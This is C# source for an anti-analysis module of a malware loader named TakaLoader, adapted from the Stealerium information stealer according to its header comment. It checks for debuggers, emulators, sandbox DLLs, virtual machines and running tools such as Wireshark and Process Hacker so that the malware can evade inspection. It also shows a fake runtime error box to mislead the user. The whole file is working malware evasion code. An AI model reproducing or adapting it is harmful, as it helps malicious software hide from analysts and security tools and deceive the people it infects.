// https://github.com/Stealerium/Stealerium/blob/main/Stub/Modules/Implant/AntiAnalysis.cs
using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static TakaLoader.DELEGATES;

namespace TakaLoader
{
    internal sealed class AntiAnalysis
    {
        //// CheckRemoteDebuggerPresent (Detect debugger)
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        //// GetModuleHandle (Detect SandBox)
        //[DllImport("kernel32.dll")]
        //private static extern IntPtr GetModuleHandle(string lpModuleName);


        /// <summary>
        ///     Returns true if the file is running in debugger; otherwise returns false
        /// </summary>
        public static bool Debugger()
        {
            var isDebuggerPresent = false;
            try
            {
                var CheckRemoteDebuggerPresentRx = DInvokeFunctions.GetFunctionDelegate<DELEGATES.CheckRemoteDebuggerPresentRx>("kernel32.dll", "CheckRemoteDebuggerPresent");
                CheckRemoteDebuggerPresentRx(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            {
                // ignored
            }

            return isDebuggerPresent;
        }

        /// <summary>
        ///     Returns true if the file is running in emulator; otherwise returns false
        /// </summary>
        public static bool Emulator()
        {
            try
            {
                var ticks = DateTime.Now.Ticks;
                Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                    return true;
            }
            catch
            {
                // ignored
            }

            return false;
        }

        /// <summary>
        ///     Returns true if a process is started from the list; otherwise, returns false
        /// </summary>
        public static bool Processes()
        {
            var runningProcessList = Process.GetProcesses();
            string[] selectedProcessList =
            {
                "processhacker",
                "netstat", "netmon", "tcpview", "wireshark",
                "filemon", "regmon", "cain"
            };
            return runningProcessList.Any(process => selectedProcessList.Contains(process.ProcessName.ToLower()));
        }

        /// <summary>
        ///     Returns true if the file is running in sandbox; otherwise returns false
        /// </summary>
        public static bool SandBox()
        {
            var dlls = new[]
            {
                "SbieDll",
                "SxIn",
                "Sf2",
                "snxhk",
                "cmdvrt32"
            };
            var GetModuleHandleRx = DInvokeFunctions.GetFunctionDelegate<DELEGATES.GetModuleHandleRx>("kernel32.dll", "GetModuleHandle");
            return dlls.Any(dll => GetModuleHandleRx(dll + ".dll").ToInt32() != 0);
        }

        /// <summary>
        ///     Returns true if the file is running in VirtualBox or VmWare; otherwise returns false
        /// </summary>
        public static bool VirtualBox()
        {
            using (var managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using (var managementObjectCollection = managementObjectSearcher.Get())
                    {
                        foreach (var managementBaseObject in managementObjectCollection)
                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
                                 managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
                                managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") ||
                                managementBaseObject["Model"].ToString() == "VirtualBox")
                                return true;
                    }
                }
                catch
                {
                    // ignored
                }
            }

            foreach (var managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2",
                         "SELECT * FROM Win32_VideoController").Get())
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware")
                    && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                    return true;

            return false;
        }

        /// <summary>
        ///     Detect virtual enviroment
        /// </summary>
        public static bool Run()
        {
            if (Processes()) { Logging.Log("AntiAnalysis : Process detected!"); return true; }
            if (VirtualBox()) {Logging.Log("AntiAnalysis : Virtual machine detected!"); return true; }
            if (SandBox()) {Logging.Log("AntiAnalysis : SandBox detected!"); return true; }
            if (Emulator())  {Logging.Log("AntiAnalysis : Emulator detected!", true); return true; }
            if (Debugger()) {Logging.Log("AntiAnalysis : Debugger detected!"); return true; }

            return false;
        }

        /// <summary>
        ///     Run fake error message and self destruct
        /// </summary>
        public static void FakeErrorMessage()
        {
            Random random = new Random();
            var code = random.Next(1, 1000000).ToString();
            code = "0x" + code.Substring(0, 5);
            Logging.Log("Sending fake error message box with code: " + code);
            MessageBox.Show("Exit code " + code, "Runtime error",
                MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
        }
    }
}